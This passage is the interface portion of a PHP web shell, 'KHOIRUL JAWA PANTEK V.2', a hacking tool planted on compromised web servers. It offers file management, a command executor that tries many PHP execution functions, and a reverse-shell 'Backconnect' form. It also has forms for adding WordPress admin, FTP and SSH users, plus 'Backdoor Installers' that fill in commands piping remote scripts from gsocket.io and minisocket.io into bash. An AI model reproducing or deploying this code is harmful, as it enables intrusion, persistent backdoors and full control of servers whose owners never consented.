            outline: none;
            width: 90%;
        }
        .prompt {
            color: #0f0;
            margin-right: 5px;
        }
        input, textarea, select {
            background: #222;
            color: #0f0;
            border: 1px solid #0f0;
            padding: 5px;
        }
        input[type="submit"], input[type="button"] {
            background-color: #333;
            color: white;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            border-radius: 3px;
        }
        input[type="submit"]:hover, input[type="button"]:hover {
            background-color: #555;
        }
        a {
            color: #0af;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid #0f0;
            padding: 5px;
            text-align: left;
        }
        .sysinfo {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #0f0;
            padding: 10px;
            margin-bottom: 15px;
        }
        pre {
            background: #000;
            color: #0f0;
            padding: 10px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
        <div class="window">
            <h2>📁 KHOIRUL JAWA PANTEK V.2 By Susu</h2>
            <div class="sysinfo">
                <?php $shell_home = getcwd(); ?>
                <b>Current Directory:</b> 
                <a href='?path=/'>🏠 Root</a> | 
                <a href='?path=<?php echo urlencode($shell_home); ?>'>💾 Shell Home</a> / 
                <?php echo get_current_path_links($dir); ?>
            </div>
            <?php
            $user = function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : get_current_user();
            $os = php_uname();
            $server_ip = gethostbyname(gethostname());
            $client_ip = $_SERVER['REMOTE_ADDR'];
            $server_software = $_SERVER['SERVER_SOFTWARE'];
            $php_version = phpversion();
            ?>
            <div class="sysinfo">
                <b>🔐 User:</b> <?php echo htmlspecialchars($user); ?>   | 
                <b>🖥 OS:</b> <?php echo htmlspecialchars($os); ?>   | 
                <b>🌐 Server IP:</b> <?php echo htmlspecialchars($server_ip); ?>   | 
                <b>👤 Client IP:</b> <?php echo htmlspecialchars($client_ip); ?>   | 
                <b>⚙️ PHP:</b> <?php echo htmlspecialchars($php_version); ?>   | 
                <b>🧰 Server:</b> <?php echo htmlspecialchars($server_software); ?>
            </div>
            <form method="GET">
                🔍 Search: <input type="text" name="search" value="<?php echo isset($_GET['search']) ? htmlspecialchars($_GET['search']) : ''; ?>">
                <input type="submit" value="Find">
            </form>
            <form method="POST" enctype="multipart/form-data">
                Upload file: <input type="file" name="upload">
                <input type="submit" value="Upload">
            </form>

            <form method="POST" id="createFileForm" style="margin-top:10px;" onsubmit="return submitCreateFile();">
                📄 Create File:
                <input type="text" name="new_file_name" id="newFileInput" placeholder="nama_file.txt">
                <input type="hidden" name="create_file" value="1">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($dir); ?>">
                <input type="submit" value="Create">
            </form>

            <script>
            function submitCreateFile() {
                const input = document.getElementById("newFileInput");
                if (input.value.trim() === "") {
                    alert("⚠️ Nama file tidak boleh kosong.");
                    return false;
                }
                return true;
            }
            </script>

            <form method="POST" id="createDirForm" style="margin-top:5px;" onsubmit="return submitCreateDir();">
                📁 Create Directory:
                <input type="text" name="new_dir_name" id="newDirInput" placeholder="nama_folder">
                <input type="hidden" name="create_dir" value="1">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($dir); ?>">
                <input type="submit" value="Create">
            </form>

            <script>
            function submitCreateDir() {
                const input = document.getElementById("newDirInput");
                if (input.value.trim() === "") {
                    alert("⚠️ Nama folder tidak boleh kosong.");
                    return false;
                }
                return true;
            }
            </script>
<br>
            <form method="POST">
            <table>
            <tr><th>🗑️</th><th>Nama</th><th>Ukuran</th><th>CHMOD</th><th>Owner</th><th>Group</th><th>Tipe</th><th>Aksi</th></tr>
            <?php
            foreach ($files as $f) {
                if ($f == ".") continue;
                if ($f == "..") {
                    $parent = dirname($dir);
                    echo "<tr><td></td><td><a href='?path=$parent'>🔙 Go Back</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td>Dir</td><td>-</td></tr>";
                    continue;
                }
                if ($search && stripos($f, $search) === false) continue;
                $path = "$dir/$f";
                $filesize = is_file($path) ? formatSize(filesize($path)) : '-';
                $perm = perms($path);
                $type = is_dir($path) ? 'Directory' : 'File';
                $owner = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($path))['name'] : fileowner($path);
                $group = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($path))['name'] : filegroup($path);
                echo "<tr>
                <td><input type='checkbox' name='selected_files[]' value='" . htmlspecialchars($path) . "'></td>
                <td><a href='?" . (is_dir($path) ? "path" : "view") . "=" . urlencode($path) . "'>" . htmlspecialchars($f) . "</a></td>
                <td>$filesize</td>
                <td>
                    <form method='POST' style='display:inline;'>
                        <input type='hidden' name='chmod_file' value='" . htmlspecialchars($path) . "'>
                        <input type='hidden' name='path' value='" . htmlspecialchars($dir) . "'>
                        <input type='text' name='chmod' value='$perm' size='4'>
                        <input type='submit' value='Set'>
                    </form>
                </td>
                <td>$owner</td>
                <td>$group</td>
                <td>$type</td>
                <td>";
                if (!is_dir($path)) {
                    echo "<a href='?view=$path'>Open</a> | <a href='?download=$path'>Download</a> | <a href='?del=$path' onclick='return confirm(\"Delete?\")'>Delete</a> | ";
                    echo "<form method='POST' style='display:inline;'>
                        <input type='hidden' name='rename' value='" . htmlspecialchars($path) . "'>
                        <input type='hidden' name='path' value='" . htmlspecialchars($dir) . "'>
                        <input type='text' name='newname' value='" . htmlspecialchars(basename($path)) . "' style='width:100px;'>
                        <input type='submit' value='Rename'>
                    </form>";
                    if (preg_match('/\.zip$/i', $f)) {
                        echo " | <a href='?extract=$path'>Extract ZIP</a>";
                    }
                } else {
                    echo "<form method='POST' style='display:inline;'>
                        <input type='hidden' name='zip_target' value='" . htmlspecialchars($path) . "'>
                        <input type='submit' name='zip_folder' value='ZIP'>
                    </form>";
                }
                echo "</td></tr>";
            }
            ?>
            </table>
            <br>
            <input type="submit" name="delete_selected" value="Delete Selected">
            </form>
        </div>

        <div class="window">
            <h3>🖥️ Super Bypass Terminal Executor</h3>
            <div id="terminal">
                <div id="terminal-output"></div>
                <div style="display: flex;">
                    <span class="prompt">$ </span>
                    <input type="text" id="cmdInput" name="cmd" placeholder="Contoh: whoami, id, ls -la">
                </div>
            </div>
            <form method="POST" id="cmdForm" onsubmit="return submitCmd();">
                <select name="cmd_method">
                    <option value="auto">Auto (Try All)</option>
                    <option value="shell_exec">shell_exec</option>
                    <option value="exec">exec</option>
                    <option value="system">system</option>
                    <option value="passthru">passthru</option>
                    <option value="popen">popen</option>
                    <option value="proc_open">proc_open</option>
                    <option value="backtick">backtick</option>
                    <option value="file_exec">file_exec</option>
                    <option value="com_exec">com_exec (Windows)</option>
                </select>
                <input type="submit" name="cmd_exec" value="Execute">
            </form>
        </div>

        <div class="window">
            <h3>🌐 Backdoor Installers</h3>
            <form id="backdoorForm">
                <input type="button" onclick="copyToTerminal('gsocket')" value="Gsocket Command">
                <input type="button" onclick="copyToTerminal('mini_nc')" value="Mini NC Command">
            </form>
        </div>

        <div class="window">
            <h3>👤 Add WordPress User</h3>
            <form method="POST" id="wpUserForm" onsubmit="return submitWpUser();">
                <label>Username:</label><br>
                <input type="text" name="wp_username" placeholder="admin123" style="width:70%;"><br>
                <label>Password:</label><br>
                <input type="text" name="wp_password" placeholder="securepassword" style="width:70%;"><br>
                <label>Email:</label><br>
                <input type="email" name="wp_email" placeholder="admin@domain.com" style="width:70%;"><br>
                <input type="submit" name="wp_add_user" value="Add User" style="margin-top:10px;">
            </form>
        </div>

        <div class="window">
            <h3>🛡️ Auto Spawn Shell Killer</h3>
            <form method="POST" id="spawnKillerForm">
                <input type="submit" name="spawn_killer" value="Run Shell Killer">
                <input type="submit" name="save_killer" value="Save Script to File">
            </form>
        </div>

        <div class="window">
            <h3>🔗 Backconnect</h3>
            <form method="POST" id="backconnectForm" onsubmit="return submitBackconnect();">
                <label>IP Address:</label><br>
                <input type="text" name="bc_ip" placeholder="192.168.1.100" style="width:70%;"><br>
                <label>Port:</label><br>
                <input type="number" name="bc_port" placeholder="4444" min="1" max="65535" style="width:70%;"><br>
                <label>Method:</label><br>
                <select name="bc_method" style="width:70%;">
                    <option value="bash">Bash</option>
                    <option value="python">Python</option>
                    <option value="perl">Perl</option>
                    <option value="nc">Netcat</option>
                    <option value="php">PHP</option>
                </select><br>
                <input type="submit" name="backconnect" value="Connect" style="margin-top:10px;">
            </form>
        </div>

        <div class="window">
            <h3>📡 Auto Add FTP</h3>
            <form method="POST" id="ftpForm" onsubmit="return submitFtp();">
                <label>Username:</label><br>
                <input type="text" name="ftp_username" placeholder="ftpuser" style="width:70%;"><br>
                <label>Password:</label><br>
                <input type="text" name="ftp_password" placeholder="ftppass123" style="width:70%;"><br>
                <label>Home Directory:</label><br>
                <input type="text" name="ftp_dir" value="<?php echo htmlspecialchars($dir); ?>" style="width:70%;"><br>
                <input type="submit" name="add_ftp" value="Add FTP User" style="margin-top:10px;">
            </form>
        </div>

        <div class="window">
            <h3>🔑 Auto Add SSH</h3>
            <form method="POST" id="sshForm" onsubmit="return submitSsh();">
                <label>Username:</label><br>
                <input type="text" name="ssh_username" placeholder="sysuser" style="width:70%;"><br>
                <label>Password (optional):</label><br>
                <input type="text" name="ssh_password" placeholder="sshpass123" style="width:70%;"><br>
                <label>Public Key (optional):</label><br>
                <textarea name="ssh_pubkey" placeholder="ssh-rsa AAAAB3NzaC1yc2E..." style="width:70%;height:100px;"></textarea><br>
                <label>Shell:</label><br>
                <select name="ssh_shell" style="width:70%;">
                    <option value="/bin/bash">/bin/bash</option>
                    <option value="/bin/sh">/bin/sh</option>
                    <option value="/sbin/nologin">/sbin/nologin</option>
                </select><br>
                <input type="submit" name="add_ssh" value="Add SSH User" style="margin-top:10px;">
            </form>
        </div>
    </div>

    <script>
        function submitCmd() {
            const cmd = document.getElementById('cmdInput').value;
            const method = document.querySelector('select[name="cmd_method"]').value;
            if (cmd.trim() === "") {
                alert("⚠️ Command cannot be empty.");
                return false;
            }

            const formData = new FormData();
            formData.append('cmd', cmd);
            formData.append('cmd_method', method);
            formData.append('cmd_exec', '1');

            fetch(window.location.href, {
                method: 'POST',
                body: formData,
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            })
            .then(response => response.text())
            .then(data => {
                const outputDiv = document.getElementById('terminal-output');
                outputDiv.innerHTML += '<pre>' + data + '</pre>';
                outputDiv.scrollTop = outputDiv.scrollHeight;
                document.getElementById('cmdInput').value = '';
            })
            .catch(error => {
                console.error('Error:', error);
            });

            return false;
        }

        function copyToTerminal(type) {
            const cmdInput = document.getElementById('cmdInput');
            if (type === 'gsocket') {
                cmdInput.value = 'curl -Lso- gsocket.io/x | bash';
            } else if(type === 'mini_nc') {
                cmdInput.value = 'bash -c "$(curl -fsSL https://minisocket.io/bin/x)"';
            }
        }

        function submitWpUser() {
            const username = document.querySelector('input[name="wp_username"]').value;
            const password = document.querySelector('input[name="wp_password"]').value;
            const email = document.querySelector('input[name="wp_email"]').value;
            if (username.trim() === "" || password.trim() === "" || email.trim() === "") {
                alert("⚠️ All fields are required.");
                return false;
            }
            return true;
        }

        function submitBackconnect() {
            const ip = document.querySelector('input[name="bc_ip"]').value;
            const port = document.querySelector('input[name="bc_port"]').value;
            if (!ip.match(/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/) || port < 1 || port > 65535) {
                alert("⚠️ Invalid IP or port.");
                return false;
            }
            return true;
        }

        function submitFtp() {
            const username = document.querySelector('input[name="ftp_username"]').value;
            const password = document.querySelector('input[name="ftp_password"]').value;
            const dir = document.querySelector('input[name="ftp_dir"]').value;
            if (username.trim() === "" || password.trim() === "" || dir.trim() === "") {
                alert("⚠️ All fields are required.");
                return false;
            }
            if (!username.match(/^[a-zA-Z0-9_-]+$/)) {
                alert("⚠️ Invalid username.");
                return false;
            }
            return true;
        }

        function submitSsh() {
            const username = document.querySelector('input[name="ssh_username"]').value;
            if (username.trim() === "") {
                alert("⚠️ Username is required.");
                return false;
            }
            if (!username.match(/^[a-zA-Z0-9_-]+$/)) {
                alert("⚠️ Invalid username.");
                return false;
            }
            return true;
        }

        document.getElementById('cmdInput').addEventListener('keydown', function(event) {
    if (event.key === 'Enter') {
        event.preventDefault(); // Cegah form submit default
        submitCmd(); // Panggil fungsi submitCmd
    }
});
    </script>
</body>
</html>
<?php
} catch (Exception $e) {
    error_log("Main block error: " . $e->getMessage());
    header('HTTP/1.1 500 Internal Server Error');
    echo "<h1>500 Internal Server Error</h1><p>" . htmlspecialchars($e->getMessage()) . "</p>";
    exit;
}
?>
